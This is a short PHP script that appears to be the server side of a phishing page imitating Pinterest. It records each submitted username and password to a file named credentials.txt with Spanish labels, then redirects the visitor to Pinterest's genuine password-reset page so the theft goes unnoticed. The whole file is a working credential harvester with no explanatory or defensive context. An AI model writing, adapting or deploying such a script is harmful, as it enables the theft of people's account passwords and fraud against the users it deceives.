<?php
file_put_contents("credentials.txt", "[+] Pinterest -> Usuario: " . $_POST['id'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.pinterest.com/password/reset/');
exit();
?>
